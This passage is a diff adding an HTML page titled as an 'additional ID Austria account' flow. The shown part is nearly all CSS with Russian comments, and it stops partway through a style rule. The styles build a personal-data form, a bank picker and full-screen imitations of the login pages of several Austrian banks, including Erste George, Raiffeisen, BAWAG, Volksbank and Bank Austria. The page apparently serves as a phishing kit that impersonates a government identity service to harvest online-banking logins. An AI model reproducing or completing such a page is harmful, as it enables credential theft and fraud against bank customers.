@@ -1,0 +1,3110 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zusätzliches ID Austria Konto</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #ffffff;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ============================================================
+           Синяя полоса
+           ============================================================ */
+        .intro-top {
+            width: 100%;
+            background: #0e2f52;
+            padding: 38px 24px;
+            text-align: center;
+        }
+
+        .intro-top h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #ffffff;
+            letter-spacing: 0.2px;
+            line-height: 1.3;
+        }
+
+        /* ============================================================
+           Шаги
+           ============================================================ */
+        .intro-steps {
+            display: flex;
+            align-items: flex-end;
+            justify-content: flex-start;
+            gap: 0;
+            padding: 56px 24px 0;
+            border-bottom: none;
+            overflow-x: auto;
+            overflow-y: hidden;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+            white-space: nowrap;
+        }
+
+        .intro-steps::-webkit-scrollbar { display: none; }
+
+        .step {
+            flex: 0 0 auto;
+            min-width: 170px;
+            text-align: left;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #b8b8b8;
+            color: #8a8a8a;
+            font-size: 15px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            margin-right: 18px;
+            white-space: nowrap;
+        }
+
+        .step:last-child { margin-right: 0; }
+
+        .step.active {
+            border-bottom-color: #0e2f52;
+            color: #0e2f52;
+            font-weight: 700;
+        }
+
+        .step.done {
+            border-bottom-color: #2e9b3a;
+            color: #2e9b3a;
+            font-weight: 600;
+        }
+
+        /* ============================================================
+           Экраны
+           ============================================================ */
+        .screen {
+            display: none;
+            flex: 1 0 auto;
+            padding: 40px 24px 60px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .screen.active { display: flex; }
+
+        .intro-inner {
+            width: 100%;
+            max-width: 640px;
+        }
+
+        /* ============================================================
+           Экран 1 — вводный
+           ============================================================ */
+        .intro-title {
+            font-size: 52px;
+            font-weight: 500;
+            color: #0e2f52;
+            margin-bottom: 36px;
+            letter-spacing: -0.8px;
+            line-height: 1.1;
+        }
+
+        .intro-text {
+            font-size: 17px;
+            font-weight: 400;
+            color: #1a1a1a;
+            line-height: 1.6;
+            margin-bottom: 34px;
+        }
+
+        .intro-text .line { display: block; }
+
+        .intro-warning {
+            background: #fdf6e0;
+            border: none;
+            border-radius: 2px;
+            padding: 26px 24px 28px;
+        }
+
+        .intro-warning-title {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #3f3f3f;
+            margin-bottom: 16px;
+            line-height: 1.45;
+        }
+
+        .intro-warning-title svg {
+            flex-shrink: 0;
+            width: 22px;
+            height: 22px;
+            color: #3f3f3f;
+            margin-top: 1px;
+        }
+
+        .intro-warning-title .notwendig {
+            display: inline-block;
+            transform: translateX(-30px);
+        }
+
+        .intro-warning-text {
+            font-size: 15.5px;
+            color: #1a1a1a;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        .intro-warning-subtitle {
+            font-size: 15.5px;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
+        .intro-warning-list {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 22px 0;
+        }
+
+        .intro-warning-list li {
+            font-size: 15.5px;
+            color: #1a1a1a;
+            line-height: 1.5;
+            padding: 6px 0 6px 18px;
+            position: relative;
+        }
+
+        .intro-warning-list li::before {
+            content: '';
+            position: absolute;
+            left: 4px;
+            top: 14px;
+            width: 3px;
+            height: 3px;
+            background: #1a1a1a;
+            border-radius: 50%;
+        }
+
+        .intro-warning-footer {
+            font-size: 15.5px;
+            font-weight: 400;
+            color: #1a1a1a;
+            line-height: 1.55;
+            margin-top: 22px;
+        }
+
+        /* ============================================================
+           Экран 2 / 3 — общие
+           ============================================================ */
+        .brand-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-top: -50px;
+            margin-bottom: 20px;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .brand-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .brand-left img {
+            width: 190px;
+            height: 190px;
+            display: block;
+            object-fit: contain;
+        }
+
+        .data-title {
+            font-size: 34px;
+            font-weight: 400;
+            color: #0e2f52;
+            line-height: 1.2;
+            letter-spacing: -0.4px;
+            margin-top: -80px;
+            margin-bottom: 24px;
+        }
+
+        .data-desc {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1a1a1a;
+            line-height: 1.6;
+            margin-top: -25px;
+            margin-bottom: 34px;
+        }
+
+        /* ============================================================
+           Форма — карточка
+           ============================================================ */
+        .form-card {
+            width: 90%;
+            max-width: 560px;
+            margin: 0 auto 30px;
+            border: 1px solid #4a6b8e;
+            border-radius: 6px;
+            overflow: hidden;
+            background: #ffffff;
+        }
+
+        .form-card-header {
+            background: #0e4d8c;
+            color: #ffffff;
+            padding: 16px 24px;
+            font-size: 17px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+            border-bottom: 1px solid #4a6b8e;
+        }
+
+        .form-card-body {
+            background: #ffffff;
+            padding: 8px 24px 24px;
+        }
+
+        /* ---------- Поля ---------- */
+        .form-field {
+            display: flex;
+            flex-direction: column;
+            margin-top: 18px;
+        }
+
+        .form-field label {
+            font-size: 14px;
+            color: #333333;
+            margin-bottom: 6px;
+            font-weight: 400;
+        }
+
+        .form-field label .req {
+            color: #c8102e;
+            margin-left: 2px;
+        }
+
+        .form-field input,
+        .form-field select {
+            width: 100%;
+            height: 42px;
+            padding: 0 14px;
+            border: 1px solid #d5d5d5;
+            border-radius: 4px;
+            background: #ffffff;
+            font-size: 15px;
+            font-family: inherit;
+            color: #1a1a1a;
+            outline: none;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .form-field input::placeholder { color: #b8b8b8; }
+
+        .form-field input:focus,
+        .form-field select:focus {
+            border-color: #0e4d8c;
+            box-shadow: 0 0 0 2px rgba(14, 77, 140, 0.12);
+        }
+
+        .form-field input.invalid,
+        .form-field select.invalid {
+            border-color: #c8102e;
+            background: #fff5f7;
+            box-shadow: 0 0 0 2px rgba(200, 16, 46, 0.10);
+        }
+
+        .form-field.field-postcode input {
+            width: 130px;
+        }
+
+        /* ---------- Bank select ---------- */
+        .bank-select-wrapper {
+            position: relative;
+            width: 150px;
+            max-width: 100%;
+        }
+
+        .bank-select-wrapper select {
+            width: 100%;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-color: #f2f2f2;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23666666' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 12px;
+            padding: 0 30px 0 12px;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            color: #4a6b8e;
+            font-size: 14px;
+            font-weight: 400;
+            height: 40px;
+            cursor: pointer;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .bank-select-wrapper select:focus {
+            border-color: #0e4d8c;
+            box-shadow: 0 0 0 2px rgba(14, 77, 140, 0.12);
+        }
+
+        .bank-select-wrapper select.invalid {
+            border-color: #c8102e;
+            background-color: #fff5f7;
+            box-shadow: 0 0 0 2px rgba(200, 16, 46, 0.10);
+        }
+
+        .bank-select-wrapper select option {
+            color: #1a1a1a;
+            background: #ffffff;
+        }
+
+        .field-error {
+            font-size: 11px;
+            color: #c8102e;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+
+        .field-error:empty { display: none; }
+
+        /* ============================================================
+           Экран 3 — Базовые стили для банков
+           ============================================================ */
+        .bank-intro-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1a1a1a;
+            line-height: 1.6;
+            margin-top: -25px;
+            margin-bottom: 30px;
+        }
+
+        /* --- Хедер для ERSTE (George) --- */
+        .george-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 30px;
+            margin-top: 10px;
+        }
+        .george-logo {
+            width: 96px;
+            height: 96px;
+            display: block;
+            object-fit: contain;
+            margin-bottom: 20px;
+        }
+        .george-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+        .george-subtitle {
+            font-size: 14px;
+            font-weight: 400;
+            color: #555555;
+            line-height: 1.5;
+            max-width: 420px;
+        }
+
+        /* ============================================================
+           Оболочки кастомных банков (на весь экран)
+           ============================================================ */
+        .bank-full-wrapper {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            overflow-y: auto;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для Bank99
+           ============================================================ */
+        .bank99-wrapper {
+            background: #e5e9f0;
+            padding: 40px 24px 60px;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .bank99-content {
+            width: 100%;
+            max-width: 640px;
+        }
+
+        .bank99-logo-top {
+            width: 120px;
+            margin-bottom: 40px;
+        }
+
+        .bank99-box {
+            width: 100%;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .bank99-header {
+            background: #ffeb00;
+            padding: 20px 24px;
+            font-size: 22px;
+            font-weight: 400;
+            color: #000000;
+        }
+
+        .bank99-body {
+            padding: 24px;
+        }
+
+        .bank99-intro {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .bank99-label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 8px;
+        }
+
+        .bank99-label-row label {
+            font-size: 14px;
+            color: #333;
+            font-weight: 400;
+        }
+
+        .bank99-links a {
+            font-size: 12px;
+            color: #0056b3;
+            text-decoration: underline;
+            margin-left: 4px;
+        }
+
+        .bank99-input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #d5d5d5;
+            border-radius: 4px;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #1a1a1a;
+            outline: none;
+            margin-bottom: 18px;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .bank99-input:focus {
+            border-color: #0e4d8c;
+            box-shadow: 0 0 0 2px rgba(14, 77, 140, 0.12);
+        }
+
+        .bank99-separator {
+            height: 1px;
+            background: #eee;
+            margin: 0 -24px 24px -24px;
+        }
+
+        .bank99-btn {
+            width: 100%;
+            height: 46px;
+            background: #ffeb00;
+            color: #000000;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background 0.15s ease;
+        }
+
+        .bank99-btn:hover {
+            background: #ebd800;
+        }
+
+        .bank99-forgot {
+            text-align: center;
+            margin-top: 16px;
+            padding-bottom: 10px;
+        }
+        .bank99-forgot a {
+            font-size: 13px;
+            color: #0056b3;
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для VOLKSBANK
+           ============================================================ */
+        .vb-wrapper {
+            background: #dce6f0;
+            padding: 40px 24px 60px;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .vb-content {
+            width: 100%;
+            max-width: 640px;
+        }
+
+        .vb-logo-top {
+            width: 140px;
+            margin-bottom: 40px;
+            display: block;
+        }
+
+        .vb-box {
+            width: 100%;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .vb-header {
+            background: #0056b3;
+            padding: 20px 24px;
+            font-size: 22px;
+            font-weight: 400;
+            color: #ffffff;
+        }
+
+        .vb-body {
+            padding: 24px;
+        }
+
+        .vb-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .vb-label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 8px;
+        }
+
+        .vb-label-row label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .vb-links a {
+            font-size: 13px;
+            color: #0056b3;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+        
+        .vb-links a:hover {
+            text-decoration: underline;
+        }
+
+        .vb-input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #d5d5d5;
+            border-radius: 4px;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #1a1a1a;
+            outline: none;
+            margin-bottom: 18px;
+            background: #e8e8e8;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .vb-input:focus {
+            background: #ffffff;
+            border-color: #0056b3;
+            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.12);
+        }
+
+        .vb-agb-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .vb-separator {
+            height: 1px;
+            background: #eee;
+            margin: 0 -24px 24px -24px;
+        }
+
+        .vb-btn {
+            width: 100%;
+            height: 46px;
+            background: #1e6bd6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background 0.15s ease;
+        }
+
+        .vb-btn:hover {
+            background: #1553a6;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для RAIFFEISENBANK
+           ============================================================ */
+        .rfb-wrapper {
+            background: #f3f3f3;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .rfb-hero {
+            width: 100%;
+            height: 220px;
+            background-image: url('32.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
+        .rfb-lang-select {
+            position: absolute;
+            right: 24px;
+            bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 16px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .rfb-lang-select::after {
+            content: '';
+            display: block;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid #333;
+            border-bottom: 2px solid #333;
+            transform: rotate(45deg) translateY(-2px);
+        }
+
+        .rfb-main {
+            flex: 1;
+            background: #ffffff;
+            padding: 0 24px 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        .rfb-content {
+            width: 100%;
+            max-width: 560px;
+        }
+
+        .rfb-title {
+            font-size: 32px;
+            font-weight: 400;
+            color: #1a1a1a;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            margin-top: 20px;
+        }
+
+        .rfb-desc {
+            font-size: 16px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .rfb-input-group {
+            margin-bottom: 24px;
+        }
+
+        .rfb-input-group label {
+            display: block;
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        .rfb-input-group label span {
+            color: #666;
+            margin-left: 2px;
+        }
+
+        .rfb-input,
+        .rfb-select {
+            width: 100%;
+            height: 52px;
+            border: none;
+            border-bottom: 1px solid #999;
+            background: #f4f4f4;
+            padding: 0 16px;
+            font-size: 16px;
+            color: #1a1a1a;
+            outline: none;
+            border-radius: 4px 4px 0 0;
+            transition: background 0.15s ease, border-color 0.15s ease;
+            font-family: inherit;
+        }
+
+        .rfb-select {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 14px;
+            cursor: pointer;
+        }
+
+        .rfb-input:focus,
+        .rfb-select:focus {
+            background: #ffffff;
+            border-bottom-color: #333;
+        }
+
+        .rfb-btn {
+            width: 100%;
+            height: 52px;
+            background: #ffff00;
+            color: #1a1a1a;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.15s ease;
+        }
+
+        .rfb-btn:hover {
+            background: #e6e600;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для BAWAG
+           ============================================================ */
+        .bawag-wrapper {
+            background: #f4f4f4;
+            padding: 30px 24px 60px;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .bawag-content {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .bawag-logo-top {
+            width: 220px;
+            margin-bottom: 30px;
+            display: block;
+        }
+
+        .bawag-box {
+            width: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 40px 32px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+        }
+
+        .bawag-box-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 26px;
+        }
+
+        .bawag-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .bawag-tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 30px;
+        }
+
+        .bawag-tab {
+            flex: 1;
+            text-align: center;
+            padding-bottom: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #660000;
+            border-bottom: 2px solid #660000;
+            margin-bottom: -1px;
+        }
+
+        .bawag-subtitle {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .bawag-input {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 0 16px;
+            font-size: 16px;
+            color: #1a1a1a;
+            outline: none;
+            margin-bottom: 16px;
+            transition: border-color 0.15s ease;
+        }
+
+        .bawag-input:focus {
+            border-color: #660000;
+            box-shadow: 0 0 0 1px #660000;
+        }
+
+        .bawag-input::placeholder {
+            color: #999;
+        }
+
+        .bawag-btn {
+            width: 100%;
+            max-width: 200px;
+            height: 52px;
+            background: #8b0000;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto 30px auto;
+            transition: background 0.15s ease;
+        }
+
+        .bawag-btn:hover {
+            background: #6b0000;
+        }
+
+        .bawag-forgot {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            color: #8b0000;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .bawag-forgot::before {
+            content: '›';
+            font-size: 22px;
+            line-height: 1;
+            font-weight: 400;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для SPARDA BANK
+           ============================================================ */
+        .sparda-wrapper {
+            background: #dce6f0;
+            padding: 40px 24px 60px;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .sparda-content {
+            width: 100%;
+            max-width: 640px;
+        }
+
+        .sparda-logo-top {
+            width: 140px;
+            margin-bottom: 40px;
+            display: block;
+        }
+
+        .sparda-box {
+            width: 100%;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .sparda-header {
+            background: #0056b3;
+            padding: 20px 24px;
+            font-size: 22px;
+            font-weight: 400;
+            color: #ffffff;
+        }
+
+        .sparda-body {
+            padding: 24px;
+        }
+
+        .sparda-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .sparda-label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 8px;
+        }
+
+        .sparda-label-row label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .sparda-links a {
+            font-size: 13px;
+            color: #0056b3;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+        
+        .sparda-links a:hover {
+            text-decoration: underline;
+        }
+
+        .sparda-input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #d5d5d5;
+            border-radius: 4px;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #1a1a1a;
+            outline: none;
+            margin-bottom: 18px;
+            background: #e8e8e8;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .sparda-input:focus {
+            background: #ffffff;
+            border-color: #0056b3;
+            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.12);
+        }
+
+        .sparda-agb-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .sparda-separator {
+            height: 1px;
+            background: #eee;
+            margin: 0 -24px 24px -24px;
+        }
+
+        .sparda-btn {
+            width: 100%;
+            height: 46px;
+            background: #1e6bd6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background 0.15s ease;
+        }
+
+        .sparda-btn:hover {
+            background: #1553a6;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для HYPO NOE
+           ============================================================ */
+        .hypo-wrapper {
+            background: #ffffff;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .hypo-header-bar {
+            width: 100%;
+            height: 65px;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            border-bottom: 1px solid #e0e0e0;
+            flex-shrink: 0;
+        }
+
+        .hypo-logo-top {
+            width: 190px;
+            height: 40px;
+            object-fit: contain;
+            object-position: left;
+        }
+
+        .hypo-burger {
+            width: 24px;
+            height: 24px;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><line x1='3' y1='12' x2='21' y2='12'></line><line x1='3' y1='6' x2='21' y2='6'></line><line x1='3' y1='18' x2='21' y2='18'></line></svg>");
+            background-size: contain;
+            background-repeat: no-repeat;
+            cursor: pointer;
+        }
+
+        .hypo-hero {
+            width: 100%;
+            height: 210px;
+            background-image: url('wave_top.jpg');
+            background-size: cover;
+            background-position: center;
+            flex-shrink: 0;
+        }
+
+        .hypo-main {
+            flex: 1;
+            background: #ffffff;
+            padding: 40px 24px 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .hypo-content {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .hypo-box {
+            width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: #ffffff;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            margin-bottom: 24px;
+        }
+
+        .hypo-box-header {
+            background: #f8f9fa;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #333;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .hypo-box-body {
+            padding: 20px;
+        }
+
+        .hypo-field {
+            margin-bottom: 16px;
+        }
+
+        .hypo-field label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .hypo-field label span {
+            color: #c8102e;
+        }
+
+        .hypo-field input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 15px;
+            color: #1a1a1a;
+            outline: none;
+            transition: border-color 0.15s ease;
+        }
+
+        .hypo-field input:focus {
+            border-color: #003366;
+        }
+
+        .hypo-pw-wrapper {
+            position: relative;
+        }
+
+        .hypo-pw-wrapper input {
+            padding-right: 40px;
+        }
+
+        .hypo-pw-icon {
+            position: absolute;
+            right: 12px;
+            top: 11px;
+            width: 20px;
+            height: 20px;
+            color: #666;
+            cursor: pointer;
+        }
+
+        .hypo-btn {
+            width: 100%;
+            height: 46px;
+            background: #003366;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.15s ease;
+            margin-top: 10px;
+            margin-bottom: 24px;
+        }
+
+        .hypo-btn:hover {
+            background: #002244;
+        }
+
+        .hypo-links-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .hypo-link-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            color: #333;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .hypo-link-item svg {
+            width: 18px;
+            height: 18px;
+            stroke: #666;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .hypo-link-item:hover {
+            text-decoration: underline;
+        }
+
+        .hypo-footer-text {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .hypo-footer-text a {
+            color: #0056b3;
+            text-decoration: none;
+        }
+        
+        .hypo-footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для EASY BANK
+           ============================================================ */
+        .easy-wrapper {
+            background: #ffffff;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 24px 60px;
+        }
+
+        .easy-content {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .easy-logo-top {
+            width: 245px;
+            height: 92px;
+            object-fit: contain;
+            object-position: left;
+            margin-bottom: 40px;
+        }
+
+        .easy-box {
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: #ffffff;
+            overflow: hidden;
+        }
+
+        .easy-box-header {
+            background: #e8f0e8;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .easy-box-body {
+            padding: 24px 20px;
+        }
+
+        .easy-intro {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .easy-tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 24px;
+        }
+
+        .easy-tab {
+            flex: 1;
+            text-align: center;
+            padding-bottom: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #1e6bd6;
+            border-bottom: 2px solid #1e6bd6;
+            margin-bottom: -1px;
+        }
+
+        .easy-field {
+            margin-bottom: 20px;
+        }
+
+        .easy-field label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .easy-field input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 15px;
+            color: #1a1a1a;
+            outline: none;
+            transition: border-color 0.15s ease;
+        }
+
+        .easy-field input:focus {
+            border-color: #1e6bd6;
+        }
+
+        .easy-hint {
+            font-size: 13px;
+            color: #666;
+            margin-top: 6px;
+        }
+
+        .easy-pw-wrapper {
+            position: relative;
+        }
+
+        .easy-pw-wrapper input {
+            padding-right: 40px;
+        }
+
+        .easy-pw-icon {
+            position: absolute;
+            right: 12px;
+            top: 11px;
+            width: 20px;
+            height: 20px;
+            color: #666;
+            cursor: pointer;
+        }
+
+        .easy-btn {
+            width: 100%;
+            height: 46px;
+            background: #1e6bd6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            margin-top: 10px;
+            margin-bottom: 24px;
+        }
+
+        .easy-btn:hover {
+            background: #1553a6;
+        }
+
+        .easy-forgot {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .easy-forgot::before {
+            content: '›';
+            font-size: 20px;
+            line-height: 1;
+            font-weight: 400;
+            color: #666;
+        }
+
+        /* ============================================================
+           Кастомный дизайн для BANK AUSTRIA
+           ============================================================ */
+        .ba-wrapper {
+            background: #ffffff;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 24px 60px;
+        }
+
+        .ba-content {
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .ba-logo-top {
+            width: 200px;
+            height: 80px;
+            object-fit: contain;
+            object-position: left;
+            margin-bottom: 20px;
+        }
+
+        .ba-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: #d5001c;
+            text-align: center;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+        }
+
+        .ba-warning {
+            background: #f0f4f8;
+            border: none;
+            border-radius: 4px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .ba-warning-text {
+            font-size: 15px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        .ba-warning-text:last-child {
+            margin-bottom: 0;
+        }
+
+        .ba-input-group {
+            margin-bottom: 16px;
+        }
+
+        .ba-input {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 0 16px;
+            font-size: 16px;
+            color: #1a1a1a;
+            outline: none;
+            transition: border-color 0.15s ease;
+            text-align: center;
+        }
+
+        .ba-input:focus {
